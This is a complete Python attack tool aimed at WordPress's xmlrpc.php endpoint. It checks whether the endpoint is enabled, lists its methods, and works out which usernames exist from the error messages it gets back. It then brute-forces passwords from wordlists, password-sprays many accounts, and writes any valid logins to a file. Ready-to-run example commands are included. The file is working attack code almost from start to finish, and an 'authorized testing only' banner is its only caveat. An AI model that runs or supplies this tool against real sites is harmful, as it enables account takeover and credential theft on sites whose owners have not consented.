#!/usr/bin/env python3
"""
WordPress XML-RPC Authentication Testing Tool
Author: baba01hacker
GitHub: https://github.com/baba01hacker
Version: 2.0
"""

import requests
import argparse
import sys
from typing import List, Dict, Optional, Tuple
from xml.etree import ElementTree as ET
import urllib3
import time
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Colors:
    """Terminal colors for better output readability"""
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'


class XMLRPCTester:
    """Main class for XML-RPC security testing"""
    
    def __init__(self, target_url: str, verify_ssl: bool = True, 
                 proxy: Optional[Dict] = None, delay: float = 0, verbose: bool = False):
        """
        Initialize the XML-RPC tester
        
        Args:
            target_url: Base URL of WordPress site
            verify_ssl: Whether to verify SSL certificates
            proxy: Optional proxy configuration
            delay: Delay between requests in seconds
            verbose: Enable verbose output
        """
        self.target_url = target_url.rstrip('/')
        self.xmlrpc_endpoint = f"{self.target_url}/xmlrpc.php"
        self.verify_ssl = verify_ssl
        self.proxy = proxy
        self.delay = delay
        self.verbose = verbose
        self.session = requests.Session()
        self.found_credentials = []
        self.found_users = []
        
    def _print_verbose(self, message: str):
        """Print message if verbose mode is enabled"""
        if self.verbose:
            print(message)
    
    def check_xmlrpc_enabled(self) -> bool:
        """Check if XML-RPC is enabled on the target"""
        try:
            self._print_verbose(f"[*] Checking XML-RPC endpoint: {self.xmlrpc_endpoint}")
            response = self.session.get(
                self.xmlrpc_endpoint,
                verify=self.verify_ssl,
                proxies=self.proxy,
                timeout=10
            )
            
            if response.status_code == 200 and 'XML-RPC' in response.text:
                print(f"{Colors.GREEN}[+]{Colors.RESET} XML-RPC endpoint is accessible")
                return True
            else:
                print(f"{Colors.RED}[-]{Colors.RESET} XML-RPC not enabled")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"{Colors.RED}[!]{Colors.RESET} Error: {e}")
            return False
    
    def enumerate_methods(self) -> List[str]:
        """Enumerate available XML-RPC methods"""
        payload = """<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>"""
        
        headers = {'Content-Type': 'application/xml'}
        
        try:
            response = self.session.post(
                self.xmlrpc_endpoint,
                data=payload,
                headers=headers,
                verify=self.verify_ssl,
                proxies=self.proxy,
                timeout=10
            )
            
            if response.status_code == 200:
                root = ET.fromstring(response.text)
                methods = [elem.text for elem in root.findall('.//value/string')]
                
                print(f"\n{Colors.CYAN}[*]{Colors.RESET} Found {len(methods)} methods")
                for method in methods[:15]:
                    print(f"    - {method}")
                if len(methods) > 15:
                    print(f"    ... and {len(methods) - 15} more")
                return methods
                
        except Exception as e:
            print(f"{Colors.RED}[!]{Colors.RESET} Error: {e}")
        return []
    
    def enumerate_user(self, username: str) -> bool:
        """Test if a specific username exists"""
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{username}</string></value></param>
    <param><value><string>InvalidPass123!</string></value></param>
  </params>
</methodCall>"""
        
        headers = {'Content-Type': 'application/xml'}
        
        try:
            response = self.session.post(
                self.xmlrpc_endpoint,
                data=payload,
                headers=headers,
                verify=self.verify_ssl,
                proxies=self.proxy,
                timeout=10
            )
            
            if 'incorrect password' in response.text.lower():
                print(f"{Colors.GREEN}[+]{Colors.RESET} User '{username}' EXISTS")
                return True
            elif 'invalid username' in response.text.lower():
                print(f"{Colors.RED}[-]{Colors.RESET} User '{username}' not found")
                return False
            else:
                self._print_verbose(f"{Colors.YELLOW}[?]{Colors.RESET} Unclear for '{username}'")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"{Colors.RED}[!]{Colors.RESET} Error: {e}")
            return False
    
    def enumerate_users_from_file(self, user_file: str) -> List[str]:
        """Enumerate users from a wordlist"""
        try:
            with open(user_file, 'r', encoding='utf-8', errors='ignore') as f:
                usernames = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!]{Colors.RESET} File not found: {user_file}")
            return []
        
        print(f"\n{Colors.CYAN}[*]{Colors.RESET} Testing {len(usernames)} usernames")
        found_users = []
        
        for i, username in enumerate(usernames, 1):
            if i % 10 == 0:
                print(f"{Colors.BLUE}[*]{Colors.RESET} Progress: {i}/{len(usernames)}")
            
            if self.enumerate_user(username):
                found_users.append(username)
            
            if self.delay > 0:
                time.sleep(self.delay)
        
        self.found_users = found_users
        return found_users
    
    def test_authentication(self, username: str, password: str) -> Tuple[bool, str]:
        """Test a username/password combination"""
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{username}</string></value></param>
    <param><value><string>{password}</string></value></param>
  </params>
</methodCall>"""
        
        headers = {'Content-Type': 'application/xml'}
        
        try:
            response = self.session.post(
                self.xmlrpc_endpoint,
                data=payload,
                headers=headers,
                verify=self.verify_ssl,
                proxies=self.proxy,
                timeout=15
            )
            
            if response.status_code == 200 and '<methodResponse>' in response.text:
                if 'isAdmin' in response.text or 'blogName' in response.text:
                    return True, "Success"
                elif 'faultCode' in response.text:
                    root = ET.fromstring(response.text)
                    fault_string = root.find('.//faultString').text
                    
                    if 'incorrect password' in fault_string.lower():
                        return False, "Wrong password"
                    elif 'invalid username' in fault_string.lower():
                        return False, "Invalid user"
                    else:
                        return False, fault_string
            
            return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            return False, str(e)
    
    def test_single_password(self, username: str, password: str) -> bool:
        """Test a single username/password combination"""
        print(f"\n{Colors.CYAN}[*]{Colors.RESET} Testing: {username}:{password}")
        success, message = self.test_authentication(username, password)
        
        if success:
            print(f"{Colors.GREEN}{Colors.BOLD}[+] VALID!{Colors.RESET}")
            print(f"    User: {username} | Pass: {password}")
            self.found_credentials.append((username, password))
            return True
        else:
            print(f"{Colors.RED}[-]{Colors.RESET} Failed: {message}")
            return False
    
    def bruteforce_password(self, username: str, password_file: str, 
                           stop_on_success: bool = True) -> List[Tuple[str, str]]:
        """Bruteforce passwords for a single user"""
        try:
            with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!]{Colors.RESET} File not found: {password_file}")
            return []
        
        total = len(passwords)
        print(f"\n{Colors.CYAN}[*]{Colors.RESET} Bruteforce attack")
        print(f"    User: {username}")
        print(f"    Passwords: {total}")
        print(f"    Delay: {self.delay}s\n")
        
        start_time = datetime.now()
        
        for i, password in enumerate(passwords, 1):
            if i % 100 == 0 or i == 1:
                elapsed = (datetime.now() - start_time).total_seconds()
                rate = i / elapsed if elapsed > 0 else 0
                print(f"{Colors.BLUE}[*]{Colors.RESET} {i}/{total} ({(i/total)*100:.1f}%) - {rate:.1f} req/s")
            
            success, message = self.test_authentication(username, password)
            
            if success:
                print(f"\n{Colors.GREEN}{Colors.BOLD}[+] FOUND!{Colors.RESET}")
                print(f"    User: {username}")
                print(f"    Pass: {password}")
                print(f"    Attempt: {i}/{total}\n")
                
                self.found_credentials.append((username, password))
                
                if stop_on_success:
                    break
            
            if self.delay > 0:
                time.sleep(self.delay)
        
        elapsed = (datetime.now() - start_time).total_seconds()
        print(f"\n{Colors.CYAN}[*]{Colors.RESET} Completed in {elapsed:.2f}s")
        return self.found_credentials
    
    def password_spray(self, user_file: str, password_file: str, 
                      stop_on_success: bool = False) -> List[Tuple[str, str]]:
        """Password spray attack - test multiple users with passwords"""
        try:
            with open(user_file, 'r', encoding='utf-8', errors='ignore') as f:
                usernames = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!]{Colors.RESET} File not found: {user_file}")
            return []
        
        try:
            with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!]{Colors.RESET} File not found: {password_file}")
            return []
        
        total = len(usernames) * len(passwords)
        print(f"\n{Colors.CYAN}[*]{Colors.RESET} Password spray attack")
        print(f"    Users: {len(usernames)}")
        print(f"    Passwords: {len(passwords)}")
        print(f"    Total: {total}")
        print(f"    Delay: {self.delay}s\n")
        
        start_time = datetime.now()
        attempt = 0
        
        for password in passwords:
            print(f"\n{Colors.MAGENTA}[*]{Colors.RESET} Testing: {password}")
            
            for username in usernames:
                attempt += 1
                
                if attempt % 25 == 0:
                    elapsed = (datetime.now() - start_time).total_seconds()
                    rate = attempt / elapsed if elapsed > 0 else 0
                    print(f"{Colors.BLUE}[*]{Colors.RESET} {attempt}/{total} ({(attempt/total)*100:.1f}%) - {rate:.1f} req/s")
                
                success, message = self.test_authentication(username, password)
                
                if success:
                    print(f"\n{Colors.GREEN}{Colors.BOLD}[+] VALID!{Colors.RESET}")
                    print(f"    User: {username}")
                    print(f"    Pass: {password}\n")
                    
                    self.found_credentials.append((username, password))
                    
                    if stop_on_success:
                        return self.found_credentials
                
                if self.delay > 0:
                    time.sleep(self.delay)
        
        elapsed = (datetime.now() - start_time).total_seconds()
        print(f"\n{Colors.CYAN}[*]{Colors.RESET} Completed in {elapsed:.2f}s")
        return self.found_credentials


def save_results(creds: List[Tuple[str, str]], output: str):
    """Save found credentials to a file"""
    try:
        with open(output, 'w') as f:
            f.write(f"# Results - {datetime.now()}\n")
            for u, p in creds:
                f.write(f"{u}:{p}\n")
        print(f"{Colors.GREEN}[+]{Colors.RESET} Saved to {output}")
    except Exception as e:
        print(f"{Colors.RED}[!]{Colors.RESET} Save error: {e}")


def main():
    parser = argparse.ArgumentParser(
        description='WordPress XML-RPC Authentication Testing Tool by baba01hacker',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 xmlrpc.py -u https://target.com --enum-user admin
  python3 xmlrpc.py -u https://target.com --username david --password Test123
  python3 xmlrpc.py -u https://target.com --username david -p passwords.txt
  python3 xmlrpc.py -u https://target.com --user-file users.txt -p passwords.txt --spray
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target WordPress URL')
    parser.add_argument('--enum-user', help='Check if user exists')
    parser.add_argument('--user-file', help='Username wordlist')
    parser.add_argument('--username', help='Username for auth test')
    parser.add_argument('--password', help='Single password to test')
    parser.add_argument('-p', '--password-file', help='Password wordlist')
    parser.add_argument('--spray', action='store_true', help='Password spray mode')
    parser.add_argument('--list-methods', action='store_true', help='List XML-RPC methods')
    parser.add_argument('--delay', type=float, default=0, help='Delay between requests (seconds)')
    parser.add_argument('--continue', dest='continue_on_success', action='store_true', 
                       help='Continue after finding valid creds')
    parser.add_argument('--output', '-o', help='Save results to file')
    parser.add_argument('--no-ssl-verify', action='store_true', help='Disable SSL verification')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    print(f"""
{Colors.CYAN}╔══════════════════════════════════════════════════╗
║  WordPress XML-RPC Auth Tool - baba01hacker      ║
║  For Authorized Security Testing Only            ║
╚══════════════════════════════════════════════════╝{Colors.RESET}
""")
    
    proxy = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
    
    tester = XMLRPCTester(
        target_url=args.url,
        verify_ssl=not args.no_ssl_verify,
        proxy=proxy,
        delay=args.delay,
        verbose=args.verbose
    )
    
    if not tester.check_xmlrpc_enabled():
        sys.exit(1)
    
    try:
        if args.list_methods:
            tester.enumerate_methods()
        
        if args.enum_user:
            tester.enumerate_user(args.enum_user)
        
        if args.user_file and not args.spray and not args.password_file:
            tester.enumerate_users_from_file(args.user_file)
        
        if args.username and args.password:
            tester.test_single_password(args.username, args.password)
        
        elif args.username and args.password_file and not args.spray:
            tester.bruteforce_password(
                args.username,
                args.password_file,
                stop_on_success=not args.continue_on_success
            )
        
        elif args.spray and args.user_file and args.password_file:
            tester.password_spray(
                args.user_file,
                args.password_file,
                stop_on_success=not args.continue_on_success
            )
        
        if tester.found_credentials:
            print(f"\n{Colors.GREEN}{Colors.BOLD}RESULTS:{Colors.RESET}")
            for u, p in tester.found_credentials:
                print(f"  {u}:{p}")
            
            if args.output:
                save_results(tester.found_credentials, args.output)
    
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!]{Colors.RESET} Interrupted")
        if tester.found_credentials and args.output:
            save_results(tester.found_credentials, args.output)
        sys.exit(0)


if __name__ == "__main__":
    main()
